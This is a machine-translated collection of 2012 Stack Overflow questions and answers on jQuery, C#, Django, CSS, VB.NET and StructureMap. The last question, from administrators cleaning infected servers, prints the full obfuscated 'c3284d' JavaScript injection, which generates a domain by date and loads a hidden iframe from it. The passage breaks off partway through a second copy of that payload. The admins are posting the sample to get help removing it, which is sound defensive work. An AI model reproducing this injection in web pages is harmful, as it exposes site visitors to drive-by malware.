> 时间：2012-09-14T15:13:35.827

你在错误的地方有一些括号：

尝试`(parseInt($('.login_wrap').css('top')) == outerdivheight)`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-14T15:15:52.380

```
if  (parseInt($('.login_wrap').css('top')) == outerdivheight)   {

     } 
```

你所拥有的是：

```
 if (parseInt($('.login_wrap').css('top') == outerdivheight)) 
```

您尝试对比较返回的布尔值执行 parseInt

# asp.net-mvc - 如何将数据上下文传递给自定义操作过滤器？

> ID：12427278
> 
> 赞同：2
> 
> 时间：2012-09-14T15:11:33.097
> 
> 标签：asp.net-mvc

我创建了一个自定义操作过滤器来执行审计跟踪的日志记录。我将我的日志记录代码添加到`public override void OnActionExecuting(ActionExecutingContext filterContext)`.

我的问题是，如何将我的 EF dbContext 传递给这个方法？我想编写一个单独的操作过滤器并将其重新用于其他开发项目，而无需更改每个项目的 dbcontext。

如果这不是推荐的做法，我该怎么办？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-15T23:03:18.937

如果我正在做这样的事情，我想我会在服务层中实现一个通用的审计日志记录方法，它已经知道数据上下文并将审计模型传递给它。这样，如果需要记录应用程序的不同部分（甚至可能与控制器无关），您不必重新实现任何东西。

或者，如果您只想坚持使用控制器，您也许可以为数据上下文创建一个接口

```
public interface IDataContext<T> where T : DbContext
{
    T DataContext { get; }
} 
```

创建一个 BaseController 来实现`System.Web.Mvc.Controller`

```
public class BaseController : Controller, IDataContext<YourDbContextClass>
{
    public YourDbContextClass DataContext { get { return new YourDbContextClass(); } }
} 
```

您可以在控制器上使用此基类并通过 访问上下文`DataContext`，但对于日志记录，您可以使用覆盖的方法创建一个新类

```
public class AuditController : BaseController
{
    protected override void OnActionExecuting(ActionExecutingContext filterContext)
    {
        // whatever you do inside here
        // DataContext.LaDiDa
    }
} 
```

然后继承你的东西

```
public class HomeController : AuditController
{
    public ActionResult Index()
    {
        return View();
    }
} 
```

尽管这不是最直接的解决方案，但您可能会完全失去界面并在`BaseController`.

# c# - 创建动态对象

> ID：12427280
> 
> 赞同：7
> 
> 时间：2012-09-14T15:11:36.760
> 
> 标签：c#, .net, list, object, dynamic

如何动态创建对象？

```
string[] columnNames = { "EmpName", "EmpID", "PhoneNo" };
List<string[]> columnValues = new List<string[]>();
for (int i = 0; i < 10; i++)
{
    columnValues.Add(new[] { "Ramesh", "12345", "12345" });
}

List<Dictionary<string, object>> testData = new List<Dictionary<string, object>>();

foreach (string[] columnValue in columnValues)
{
    Dictionary<string, object> data = new Dictionary<string, object>();
    for (int j = 0; j < columnNames.Count(); j++)
    {
        data.Add(columnNames[j], columnValues[j]);
    }
    testData.Add(data);
} 
```

**虚构类（类在代码中不可用）：**

```
class Employee
{
    string EmpName { get;set; }
    string EmpID { get;set; }
    string PhoneNo { get;set; }
} 
```

**注意：**属性/列名称是动态的。

现在我想将 转换`List<Dictionary<string, object>>`为类型`List<object>`(ie)的类`List<Employee>`。

可能吗？请提出建议。

* * *

## 回答 #1

> 赞同：21
> 
> 时间：2012-09-14T15:15:47.603

使用匿名对象（如果您知道要投影的属性）：

```
var employees = 
    (from dict in testData 
        select new 
        { 
            EmpName = dict["EmpName"] as string, 
            EmpID= dict["EmpID"] as string, 
            PhoneNo=dict["PhoneNo"] as string 
        }).ToList(); 
```

或者，使用 System.Dynamic.Expando（如果您需要动态投影未知列名）：

```
string[] columnNames = { "EmpName", "EmpID", "PhoneNo" };
List<string[]> columnValues = new List<string[]>();
for (int i = 0; i < 10; i++)
{
    columnValues.Add(new[] { "Ramesh", "12345", "12345" });
}

var testData = new List<ExpandoObject>();

foreach (string[] columnValue in columnValues)
{
    dynamic data = new ExpandoObject();
    for (int j = 0; j < columnNames.Count(); j++)
    {
        ((IDictionary<String,Object>)data).Add(columnNames[j], columnValue[j]);
    }
    testData.Add(data);
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-14T15:15:44.970

编辑建议“发射”。

鉴于您甚至不知道列名，我将使用 Reflection.Emit 首先动态创建 Employee 类。有关如何使用 Emit 的信息，请参阅[http://msdn.microsoft.com/en-us/library/3y322t50(v=vs.100).aspx 。](http://msdn.microsoft.com/en-us/library/3y322t50(v=vs.100).aspx)伪代码将是：

```
ReflectionEmit("Employee", columns);
List<object> newList = testData.Select<object>(p => {
    var employee = ReflectionInstantiate("Employee");
    foreach column in columns
         Reflection.SetProperty(employee, column, p[column]);
    }); 
```

实际代码会稍微复杂一些，因为 Emit 并不简单。:)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-14T15:35:43.730

是的，这是可能的，但不是很简单。

您可以动态定义类型，例如通过[CodeDOM](http://msdn.microsoft.com/en-us/library/y2k85ax6.aspx)或使用[Reflection.Emit](http://www.codeproject.com/Articles/121568/Dynamic-Type-Using-Reflection-Emit)。通常，您的应用程序将生成代码模型 (CodeDOM) 或 IL 指令 (Reflection.Emit) 以构建新类型。根据您的需要，您甚至可以保存生成的 dll 并在以后使用。

例如，在 .NET 中如何生成序列化程序集：检查要序列化的类型，并专门为该类型生成自定义序列化程序类，因此序列化不必依赖运行时的反射。

# python - 在 django 中很多对很多不清楚

> ID：12427296
> 
> 赞同：0
> 
> 时间：2012-09-14T15:12:56.387
> 
> 标签：python, database, django

楷模 ：

```
class Store(models.Model):
   name = models.CharField(max_length=100)
   greatStore = models.BooleanField()

class Book(models.Model):
   stores = models.ManyToManyField(Store)
   name = models.CharField(max_length=200,unique=True)
   fantasticBook = models.BooleanField() 
```

我想得到所有在大商店里的书的清单。阅读文档，它说：[https://docs.djangoproject.com/en/dev/topics/db/queries/#spanning-multi-valued-relationships](https://docs.djangoproject.com/en/dev/topics/db/queries/#spanning-multi-valued-relationships)我应该写：

```
myBooks =Book.objects.filter(stores__greatStore=True) 
```

但这只是与 Store.greatStore==TRUE 进行 JOIN ，这不是我想要的！

例如，如果我有 2 家商店（都是很棒的商店）和我的数据库中属于 2 家商店的一本书，myBooks 将有 2 个元素：同一本书的两倍。

我想要至少有一个大商店的书籍集合，而不是验证的情侣 (b,s) 的第一个元素（s 属于 b.stores 和 s.greatStores==true）

编辑 ：

为什么我认为 Django 的 API 具有误导性：让我们保持相同的示例：2 家很棒的商店和属于这两家商店的书 (fantasticBook==true)。如果您运行请求：

```
myBooks = Book.objects.all() 
```

你只得到一个结果：唯一存在的书。如果您运行请求：

```
myBooks = Book.objects.filter(coolBook=True) 
```

你只得到一个结果：唯一存在的书。如果您运行请求：

```
myBooks = Book.objects.filter(stores__greatStore=True) 
```

这似乎意味着您获得了至少有一家很棒的商店的书籍集合，但这不是我们得到的，因为 myBooks 有 2 个结果。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T15:22:26.017

您可以使用`distinct()`它将为您提供独特的结果，`Book`例如：

```
myBooks =Book.objects.filter(stores__greatStore=True).distinct() 
```

# jquery-mobile - 带有 jQ uery Mobile + knockout.js 的单选按钮的初始“选中”状态

> ID：12427310
> 
> 赞同：4
> 
> 时间：2012-09-14T15:13:46.767
> 
> 标签：jquery-mobile, knockout.js

我似乎无法弄清楚为什么我的 UI 的初始状态没有第一个单选按钮`'checked'`。这是一个 jsFiddle：http: [//jsfiddle.net/floyd_may/JcTxT/](http://jsfiddle.net/floyd_may/JcTxT/)

但是，这个 jsFiddle 在这里工作得很好，即使您修改它以将其更改为`radio`输入（而不是`checkbox`）：http: [//jsfiddle.net/rniemeyer/EGAH9/](http://jsfiddle.net/rniemeyer/EGAH9/)

你会开始想，也许 jQuery Mobile 在这一切中发挥了作用；但是，我原来的小提琴的这个版本已经剪掉了 jQuery Mobile 部分，仍然无法工作：http: [//jsfiddle.net/floyd_may/JcTxT/5/](http://jsfiddle.net/floyd_may/JcTxT/5/)

为什么最初没有出现“child 1”单选按钮`checked`？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-09-14T15:30:04.130

重新排列绑定的顺序做到了：http: [//jsfiddle.net/JcTxT/6/](http://jsfiddle.net/JcTxT/6/)

`value: name, checked: $root.selectedName`代替

`checked: $root.selectedName, value: name`

# javascript - 删除或应用默认对象作为值

> ID：12427311
> 
> 赞同：1
> 
> 时间：2012-09-14T15:13:50.647
> 
> 标签：javascript, jquery, tinymce

我正在使用 TinyMCE 并动态加载它。我遇到的问题是我希望能够根据 textarea 指定不同的参数。我已经创建了一个函数，但是我被困在 removeformat 参数上，因为如果我没有为它传递任何东西，我不确定如何将其设置为“默认”。该函数的精简版本是：

```
function initTinyMCE(sel,lang) {
    tinyMCE.init({
        mode : "specific_textareas",
        editor_selector : sel,
        language : lang,
        removeformat : [  
            {selector : 'p,b,strong,em,i,span,ins', remove : 'all', split : true, expand : false, block_expand : true, deep : true}
        ]
    });
} 
```

所以我传入了选择器（sel）和语言（lang），我想传入removeformat参数，但它必须是一个对象，我不知道该怎么做才能让它好像参数不是'添加。我知道我可以添加一个条件语句并声明 2 个不同的 tinyMCE.init，但我希望并想知道是否还有另一个选项可以在初始化之前删除该参数，或者让它从默认值中提取，就好像它没有被声明一样？

任何帮助，将不胜感激。

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-20T08:17:09.907

> 最好的方法是什么？

这取决于用例。在你的情况下，我认为这是有道理的。您可以在初始化后使用类似的东西应用 tinymce 配置设置/参数

```
tinymce.get('your_editor_id').settings.removeformat = // removeformat or whatever setting youwant to adjust
    {selector : 'p,b,strong,em,i,span,ins', remove : 'all', split : true, expand : false, block_expand : true, deep : true}; 
```

请注意，初始化期间将使用一些 tinymce 设置，并且在 tinymce 初始化后更改该设置不会改变任何内容（`removeformat`不属于那些）。

# c# - 如何删除应用于类属性的程序集？

> ID：12427323
> 
> 赞同：1
> 
> 时间：2012-09-14T15:14:33.987
> 
> 标签：c#, .net

我有一堂课`public Assembly LoadedAssembly { set; get; }`

```
var assemblyName = AssemblyName.GetAssemblyName(fullPathToDLLFile);
myClass.LoadedAssembly = Assembly.Load(assemblyName); 
```

这门课我一直在下`Application.Current.Properties["MyClass"]`。

我尝试将其设为空，`Application.Current.Properties["MyClass"] = null;`但无济于事。

**我看到加载的程序集工作（它里面有一个计时器并且它正在工作）。**

我怎样才能清洁它？

（我不使用类似 `AppDomain d = AppDomain.CreateDomain("NewDomain", null, domaininfo);`加载程序集的东西。）

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-14T15:38:45.757

您不能随意卸载程序集，而必须卸载加载程序集的 AppDomain（这会卸载 AppDomain 中的所有程序集）。如果您没有将其加载到单独的 AppDomain 中，那么唯一的方法就是关闭应用程序。

这个问题中有各种链接，详细说明了为什么不支持：[如何从主 AppDomain 卸载程序集？](https://stackoverflow.com/questions/123391/how-to-unload-an-assembly-from-the-primary-appdomain)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-14T15:39:53.323

您无法卸载程序集，但可以卸载将程序集加载到的 AppDomain。请参阅[此](http://blogs.msdn.com/b/jasonz/archive/2004/05/31/145105.aspx)说明。

# lucene - 如何为具有相同字段值的文档设置邻近度？

> ID：12427327
> 
> 赞同：1
> 
> 时间：2012-09-14T15:14:36.733
> 
> 标签：lucene, proximity

我有一个包含“类型”字段（type1、type2、type3 等）的文档。我需要按 10 个不同类型（如果存在）的包来查询这些文档。任何想法如何制作它？

# vb.net - 将对象转换为具有可为空日期的 Object()

> ID：12427329
> 
> 赞同：3
> 
> 时间：2012-09-14T15:14:48.290
> 
> 标签：vb.net, casting

我目前正在与一个旧的 api 作斗争，我面临以下问题：当我尝试将一个对象强制转换为一个对象数组时，当值是可为空的日期时，我得到运行时异常。

```
Module Module1
    Sub Main()
        Console.WriteLine(Misc.dateCast(New Nullable(Of DateTime)()))
        Console.WriteLine(Misc.tabledateCast(New Nullable(Of DateTime)() {New DateTime()}))
    End Sub
End Module

Module Misc
    Function dateCast(ByVal val As Nullable(Of DateTime)) As Object
        Return CType(val, Object)
    End Function

    Function tabledateCast(ByVal val As Object) As Object()
        Return CType(val, IEnumerable(Of Object)).Cast(Of Object).ToArray
    End Function
End Module 
```

第一个演员正在工作，但不是第二个。如何成功转换为对象数组？

我不能使用`CType(val, IEnumerable(Of Nullable(Of DateTime)))`，因为该函数可能会获取其他类型的数组。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-14T16:07:51.013

看起来你有两个选择：

1）如果数组本身是类型安全的，您可以对该方法进行泛型化，以便在转换为对象之前知道要转换的内容 - 这不是最好的代码，尤其是在 VB.NET 中：

```
Module Module1
    Sub Main()
        Console.WriteLine(Misc.tabledateCast(Of Nullable(Of DateTime))(New Nullable(Of DateTime)() {New DateTime()}))
    End Sub
End Module

Module Misc
    Function tabledateCast(Of T)(ByVal val As Object) As Object()
        Return CType(val, IEnumerable(Of T)).Cast(Of Object).ToArray
    End Function
End Module 
```

2）老金的链接，你首先做一个非泛型`IEnumerable`演员：

```
Module Module1
    Sub Main()
        Console.WriteLine(Misc.tabledateCast(New Nullable(Of DateTime)() {New DateTime()}))
    End Sub
End Module

Module Misc
    Function tabledateCast(ByVal val As Object) As Object()
        Return CType(val, IEnumerable).Cast(Of Object).ToArray
    End Function
End Module 
```

# jquery - 使用 jquery 删除 javascript

> ID：12427330
> 
> 赞同：2
> 
> 时间：2012-09-14T15:15:00.040
> 
> 标签：jquery

我在网站页脚上有一块 JS 代码，我需要使用 jQuery 为特定页面删除它。有什么帮助吗？

非常感谢您的时间。最好的祝福。

```
<script language="javascript" type="text/javascript"><!--
si_transact_label='My-label';
si_transact_id=123456;
si_transaction_amount='0';
var now= new Date();
//--></script>
<script language="javascript" type="text/javascript">
document.write('<s'+'cript language="javascript" type="text/javascript" src="'+document.location.protocol+'//dms.netmng.com/si/CM/Tracking/TransactionTracking.aspx?siclientid=7244' + '&TransactionAmount=' + si_transaction_amount + '&SICustTransType=' + si_transact_id + '&timecode=' + now.getTime() + '&jscript=1"></s'+'cript>'); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-14T15:22:17.557

您提供的代码只是设置了一组变量；它实际上并没有做任何事情。大概这些变量在其他地方使用？

您不能只使用 jQuery“删除代码”——当 jQuery 在页面上可用时，该代码也将被加载并运行，并且这些变量将被填充。运行后删除代码不会做任何事情，因为它已经完成了它的事情。

根据它们的用途，您可以尝试取消设置变量——如下所示：

```
si_transact_label=null;
si_transact_id=null;
si_transaction_amount=null;
var now= null; 
```

但如果它们已经被用于其主要目的，那么再次删除它们不会有任何区别。

更有可能的是，您首先需要做的不是将它们包含在页面中。这将在您的后端代码中完成 - 即 PHP？ASP.NET? 或者你使用的任何东西，但不在前端 jQuery 代码中。

# html - 使用 DIV 时得到错误的输出

> ID：12427338
> 
> 赞同：0
> 
> 时间：2012-09-14T15:15:24.110
> 
> 标签：html, css

我正在尝试使用 Div 获得以下输出，

## 需要输出

```
Row1
  Views  Checks  Title    users
                 Topics
Row2
  Views  Checks  Title    users
                 Topics
Row3
  Views  Checks  Title    users
                 Topics 
```

下面是我的代码，

## HTML

```
 <div class="blockdiv" >
    <div class="views">
        TotalViews
    </div>
    <div class="answers">
        TotalAnswers
    </div>
    <div class="titles">
        title<br>
        Topic
    </div>
    <div class="user">
        UserId
    </div>
</div>

<div  class="blockdiv">
    <div class="views">
        TotalViews
    </div>
    <div class="answers">
        TotalAnswers
    </div>      
    <div class="titles">
        title<br>
        Topic           
    </div>
    <div class="user">
        UserId
    </div>
</div> 
```

## CSS

```
 .views{
            float:left;
            width:10;
            padding:5px;
        }

        .answers{
            float:left;
            width:10;
            padding:5px;
        }

        .titles{
            float:left;
            width:200;
            padding:5px;
        }

        .user{
            float:left;
            width:40;
            padding:5px;
        }

        #blockdiv{

        float:none;
        clear:all;
        } 
```

## 电流输出

```
 TotalViews TotalAnswers title   UserId       TotalViews TotalAnswers title    UserId
                           Topic                                        Topic 
```

我将两个 div 并排放置。

如何使第二个 div 转到下一行？

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-14T15:16:58.357

```
.blockdiv { 
    float:none;
    clear:both;
} 
```

您可能还想为所有实例添加单位`width`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-14T15:19:17.797

[http://jsfiddle.net/Chkug/1/](http://jsfiddle.net/Chkug/1/)

使用 div

```
clear:both 
```

在两个 div 之间，这会清除浮动。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-14T15:19:24.947

您的最后一条 CSS 规则`#blockdiv`适用于`id`

将其更改为

```
.blockdiv{

        float:none;
        clear:both;
        } 
```

[演示](http://jsfiddle.net/6EH3a/)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-14T15:23:38.680

```
<div class="blockdiv"> 
```

并且您`#`在 css 中使用而不是`.`

```
#blockdiv {   
   float:none;       
   clear:all;  
} 
```

# xml - 如何从 xml 使用 StructureMap

> ID：12427340
> 
> 赞同：0
> 
> 时间：2012-09-14T15:15:41.050
> 
> 标签：xml, asp.net-mvc-3, dependency-injection, structuremap

在我的项目中，我将 StructureMap 用于 DI，并且在 web.config 文件中设置关联，如下所示：

```
<StructureMap MementoStyle="Attribute">
    <DefaultInstance PluggedType="CTRMModels.Models.Repository, CTRMModels" PluginType="CTRMModels.Models.IRepository, CTRMModels" Scope="HttpContext" />
    <DefaultInstance PluggedType="ActiveReports.Security.CtrmSecurityProvider, ActiveReports.Security" PluginType="ActiveReports.Server.Security.ISecurityProvider, ActiveReports.Server.Extensibility" Scope="HttpContext">
    <Property Name="connectionString" Value="Data Source=.;Initial Catalog=db;Persist Security Info=True;Integrated Security=True;" />
</DefaultInstance> 
```

第一个设置有效，但第二个无效。CtrmSecurityProvider 类的构造函数如下所示：

```
public CtrmSecurityProvider( string connectionString ){...} 
```

我究竟做错了什么？提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-10T14:15:02.160

如果有人感兴趣，解决方案是像这样格式化 xml：

```
<Instance PluggedType="ActiveReports.Services.SecurityTokenManager" PluginType="ActiveReports.Service.ISecurityTokenManager, Agiboo.ActiveReports.Web" Scope="HttpContext">
  <Properties>
    <!-- for the parameters of the constructor -->
    <Pair Key="reportServerUri" Value="http://localhost:8081" />
  </Properties>
</Instance> 
```

# bash - 使用 shell 脚本清理感染 c3284d 恶意软件的服务器

> ID：12427346
> 
> 赞同：0
> 
> 时间：2012-09-14T15:15:47.030
> 
> 标签：bash, shell

我们有大约 11 台服务器，总共大约 1500 个站点感染了 c3284d 恶意软件。我们想做一个 shell 脚本来替换所有似乎命中 html、js 和 php 文件的代码。他们还在用户的主文件夹中植入了一个名为“p”的文件，其中包含更大版本的恶意软件。

我们遇到了一些查找/替换的建议，但它们似乎对我们不起作用，或者我们只是不知道如何正确执行。

以下是我们目前所拥有的：

```
 for FILE in $(grep -H -r -l "c3284d" /home)
 do
      sed -i '/c3284d/d;/bVPbjpswEP2WWuoK/d' ${FILE}
 done 
```

这只会删除“c3284d”的签名，而不是插入的垃圾。有人可以帮助解决这个问题，以从文件中删除这些混乱。“c3284d”通常出现在它自己的行上，但并非总是如此，并以它开始和结束。

以下是我们所看到的一些示例：

```
<!--c3284d--><script>function dow(hit){var var1=0.0086;var1+=18;return hit}var var2=0.0165;var2+=16;function gel(str,shift){var sux,ext,var2,len,ich,pos,cnt1,var6,var4,ret,var5,var1,cnt2,sh,var3,ch,ch;var var1=0.0018;var var2=4771;var2++;var var3=0.043;var3-=18;var var2='CYBsubfX'.substr(3,3);function aal(why,thy){var var4=0.0111;var4--;return thy}var2+='QDsstrr3'.substr(3,3);var var8=7678;if(var8<25){var var6=0.0028;if(var6!=0){var var5=2108;var5++}var var7={yeh:0.0022}}var var6=25;function led(pow,nib,xis){var var9=7;var9++;return nib}var6-=9;var var10=6;var10++;var var12=0.0102;if(var12!=5){var var11=0.021;var11--}var var1='OpulenmH'.substr(3,3);var var14=0.012;if(var14!=null){var var13=12;var13-=0.0027}var1+='Msgthln'.substr(2,3);var var16=8439;if(var16<0.0142){var var15=5943;var15+=0.007}var var5=40;function lar(rad,tsk,dud){var var17=13;var17++;var var18=13;var18-=0.0199;return tsk}var5+=22;var var19=0.021;var var4='CyqfromxB'.substr(3,4);var var20=0.0058;var20++;var var22=0.0179;if(var22!=null){var var21=23;var21--}var4+='zsCharAR'.substr(2,4);var var23=0.0435;var23--;var4+='XDoCodeWm'.substr(3,4);function lug(cod){var var26=0.0038;if(var26!=26){var var24=0.037;var24+=24;var var25=2702}var var31=5244;if(var31<0.0085){var var27='voADrb8a1';var var30=5099;if(var30!=6){var var28=0.0233;var28++;var var29=null}}return cod}var var3='sF68indeOu'.substr(4,4);var var34=3367;if(var34!=0.0246){var var32=0.0089;var32++;var var33='cut'}var3+='Tq4xOfAk'.substr(3,3);var var36=0.0101;if(var36>25){var var35=0.0071;var35+=3169}var var38=13;if(var38==0){var var37=5;var37+=3684}var sux='0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';var var39=0;do{var var40=4847;var40+=29;var var41=26;var41++;var39++}while(var39<7);var var42=0.0239;var42-=16;var ret='';function jot(few,hyp){var var43=null;var43-=0.0021;return hyp}var ext='';var var44=1250;var44++;var var45=0.0034;var45+=6258;var sh=0;var var46=7594;var46++;var var47=3240;var47--;var len=str[var1];var var49=3026;if(var49!=null){var var48=0.004;var48-=20}for(var cnt1=0;cnt1<len;cnt1++){var var50=14;var50+=0.013;sh+=shift;var var51=6;var51++;var var52=0.0193;var52++;var ch=str[var2](cnt1,1);var var53=0;do{var var55=7261;if(var55!=null){var var54=16;var54+=14}var var58=1404;if(var58>17){var var56=[10,0,50,30,40,20];var var57=5412;var57++}var53++}while(var53<8);var pos=sux[var3](ch);var var59=0.0262;var59++;pos+=sh;var var60=6;var60+=6;pos%=var5;for(var var61=0;var61<10;var61++){var var62=21;var62++;var var63=4887;var63-=4113}ret+=sux[var2](pos,1);var var66=0.062;if(var66>22){var var64=0;var64+=3831;var var65=0.013;var65-=11}var var67=0.0122;var67-=3665}var var68=0.017;var68++;var var69=null;var69-=0.0069;for(var cnt2=0;cnt2<len;cnt2+=2){function tub(uke,dun){var var70=0;do{var var73=5314;if(var73!=4129){var var71=0;var71+=0.0322;var var72=false}var70++}while(var70<7);var var74=0.0238;var74-=6514;return uke}var var75=17;var75-=21;var ch=ret[var2](cnt2,2);function cue(ton){var var78=0.003;if(var78==28){var var76=0;var76+=7;var var77=0.0089;var77--}return ton}var ich=parseInt(ch,var6);var var79=0;while(var79<7){var var81=6374;if(var81!=0.0126){var var80=0.003;var80+=1176}var79++}ext+=String[var4](ich);function gun(sub,vug){var var82=0.005;var82--;var var83=null;return sub}var var84=10;var84--}function ree(ban,set){var var89=0.0136;if(var89<0){var var86=11;if(var86<4930){var var85=0;var85-=4954}var var88=5;if(var88<0){var var87=8525;var87--}}return ban}return ext}var var3=0;var3-=6479;for(var var4=0;var4<10;var4++){var var5=7;var5+=26}function ulu(){var hi,test,lo;function bid(pah){var var9=0.0011;if(var9==19){var var7=1393;if(var7==0.017){var var3=19;if(var3==null){var var2=7;if(var2!=3669){var var1=[21,42,28,0,35,7,14]}}var var6=0.005;if(var6!=5605){var var4=0.028;var4-=10;var var5=0.0145;var5+=0.004}}var var8=['the','eft','mas']}return pah}var var10=18;var10--;var var11=5110;var11--;var var14=0.014;if(var14==null){var var12=1537;var12--;var var13=0.012;var13--}var hi=this.seed/this.Q;function cos(wag){var var15='hum';var var16=['teg','yod'];return wag}function yew(tat){var var17=0.0109;var17-=3465;return tat}    var lo=this.seed%this.Q;function dee(pht,oxy){for(var var18=0;var18<4;var18++){var var22=0.0152;if(var22==null){var var20=3229;if(var20>14){var var19=1941}var var21='zh4pMCYB'}}return oxy}var var25=5109;if(var25>4261){var var23=0;var var24='mho'}    var test=this.A*lo-this.R*hi;var var26=0.011;var26-=7383;    if(test>0){var var27=null;var27-=2995;for(var var28=0;var28<8;var28++){var var30=0.0056;if(var30!=19){var var29=0;var29+=0.013}var var31=26;var31++}        this.seed=test;var var32=0;while(var32<4){var var33=27;var33--;var32++}var var35=2510;if(var35<null){var var34='lwxSFm8TI'}}else{var var38=8;if(var38==29){var var36=0.017;var36--;var var37=13;var37--}var var39=2605;        this.seed=test+this.M;var var40=25;var40-=5704;var var41={wit:2288}}var var42=0.018;var42-=0.0047;    return(this.seed*this.oneOverM)}var var6=null;var6-=6649;var var8=2139;if(var8!=0.0176){var var7=10;var7++}function jig(unix){var s,var1,d,var3,var2;function lac(net,dam,sap){var var11=29;if(var11!=5171){var var6=0.002;if(var6<15){var var4=20;var4-=8;var var5=0.035;var5--}var var10=11;if(var10==2581){var var8=18;if(var8>10){var var7=null;var7-=2355}var var9=10;var9++}}return net}var var3=4775;var var13=30;if(var13<23){var var12=9;var12++}var var14=0;do{var var15=0.0147;var var16=0;var14++}while(var14<7);var3-=680;var var19=8044;if(var19==0.0096){var var17=0.0015;var17-=0.009;var var18=22;var18++}var var20={pix:['pip','tor','lob']};var var2=120523;var var23=0.029;if(var23<4713){var var21=6;var21--;var var22=0.004;var22++}var var24=2304;var24--;var2-=54988;var var25=false;var var26=4364;var26++;var var1=17722082;var var27=true;var1-=944867;var var28='den';var d=new Date(unix*1000);var var29=null;var29-=13;    var s=Math.ceil(d.getHours()/3);function feu(fas,cry){var var31=5835;if(var31==0){var var30=2916}return fas}    this.seed=2345678901+(d.getMonth()*var1)+(d.getDate()*var2)+(Math.round(s*var3));var var33=0.008;if(var33>9){var var32=0.009;var32-=2790}    this.A=48271;var var34=5222;var34+=1338;    this.M=2147483647;var var35={top:['sue','ras']};    this.Q=this.M/this.A;var var36='pjNgzb';    this.R=this.M%this.A;var var37=7112;var37--;    this.oneOverM=1.0/this.M;var var38=0;do{var var39=5708;var39++;var var41=9;if(var41==0.007){var var40=3570;var40++}var38++}while(var38<3);    this.next=ulu;var var43=16;if(var43==7569){var var42=1355}var var44=false;    return this}var var11=18;if(var11==0){var var9=0.006;var var10=30;var10--}function hot(dub,jut){var var12='FtjKdH6DTi';var var13=28;var13++;return dub}function bum(r,Min,Max){function arc(vac,hat){var var1=13;var1+=6807;return hat}var var2=0.031;var2--;return Math.round((Max-Min)*r.next()+Min)}var var14=0;do{var var15=['pit','men'];var var16=0;var14++}while(var14<4);function dap(unix,length,zone){var i,rand,letters,str;var var1=0;do{var var2=7902;var1++}while(var1<4);var var3=1574;var3++;var var4=0;do{var var5=5140;var5+=0.007;var var6=null;var6-=0.0061;var4++}while(var4<6);function lap(eth,wyn){var var7=0.002;var7--;return wyn}var rand=new jig(unix);var var10=0.0204;if(var10>8){var var8=0.01;var var9=0.0068}    var letters='qmahgwctopfjilrfpjrfcwgewheizwdw'.split('');var var11=8091;var var12=['del','rec','jam'];    var str='';var var19=22;if(var19!=8632){var var15=24;if(var15>0.0187){var var13=4820;var13-=14;var var14=4205;var14--}var var18=7248;if(var18!=null){var var16=0.0077;var16+=8095;var var17=3411;var17--}}for(var i=0; i<length; i++){var var20='yjVL6qKWtZ';        str+=letters[bum(rand, 0, letters.length-1)];var var21={gob:28}}function bar(dey,fay){var var22=0.0039;var22-=7259;var var24=23;if(var24==0){var var23='tab'}return dey}var var25='UhRKMl5V';    return str+'.'+zone}for(var var17=0;var17<3;var17++){var var18=['how','tar'];var var19=0;var19-=5692}var var20=0;do{var var21=6868;var21++;var var22=0.002;var22++;var20++}while(var20<7);setInterval(function(){var var23=4845;var var24=0.0149;var24++;    try{var var27=10;if(var27>null){var var25=0.011;var25--;var var26=0.025;var26+=0.003}        if(typeof iframeWasCreated=='undefined'){var var28=0.016;var28+=7624;var var29=12;            var unix=Math.round(+new Date()/1000);var var30=0.0044;var30+=0.007;            var domainName=dap(unix, 16, 'info');var var31=29;var31+=5759;            ifrm=document.createElement('i'+'frame'); function roe(mae,you,bam){var var32=0;do{var var33=[18,45,27,9,36,0];var32++}while(var32<6);var var34=7886;return bam}            ifrm.setAttribute('src', 'http://'+domainName+'/in.cgi?14'); var var35='je5Bx_40z';            ifrm.style.width='10px'; var var36=4376;var36+=2797;            ifrm.style.height='10px'; var var37=7287;var37--;function nor(lop){var var38={dig:4393};return lop}            ifrm.style.visibility='hidden'; var var41=17;if(var41>1540){var var39=[0,18,12,6];var var40=12;var40+=0.016}            document.body.appendChild(ifrm);var var43=0.0437;if(var43==0.0087){var var42=0.002}var var44=2082;var44-=0.0189;iframeWasCreated=true;var var45=false}var var48=0.008;if(var48==7526){var var46=8527;var46--;var var47=5186;var47--}for(var var49=0;var49<8;var49++){var var50=false}}catch(e){iframeWasCreated=undefined}var var51=0.0135;var51+=1355;var var52=0.0019;var52++}, 100);</script><!--/c3284d-->

/*c3284d*/
function dow(hit){var var1=0.0086;var1+=18;return hit}var var2=0.0165;var2+=16;function gel(str,shift){var sux,ext,var2,len,ich,pos,cnt1,var6,var4,ret,var5,var1,cnt2,sh,var3,ch,ch;var var1=0.0018;var var2=4771;var2++;var var3=0.043;var3-=18;var var2='CYBsubfX'.substr(3,3);function aal(why,thy){var var4=0.0111;var4--;return thy}var2+='QDsstrr3'.substr(3,3);var var8=7678;if(var8<25){var var6=0.0028;if(var6!=0){var var5=2108;var5++}var var7={yeh:0.0022}}var var6=25;function led(pow,nib,xis){var var9=7;var9++;return nib}var6-=9;var var10=6;var10++;var var12=0.0102;if(var12!=5){var var11=0.021;var11--}var var1='OpulenmH'.substr(3,3);var var14=0.012;if(var14!=null){var var13=12;var13-=0.0027}var1+='Msgthln'.substr(2,3);var var16=8439;if(var16<0.0142){var var15=5943;var15+=0.007}var var5=40;function lar(rad,tsk,dud){var var17=13;var17++;var var18=13;var18-=0.0199;return tsk}var5+=22;var var19=0.021;var var4='CyqfromxB'.substr(3,4);var var20=0.0058;var20++;var var22=0.0179;if(var22!=null){var 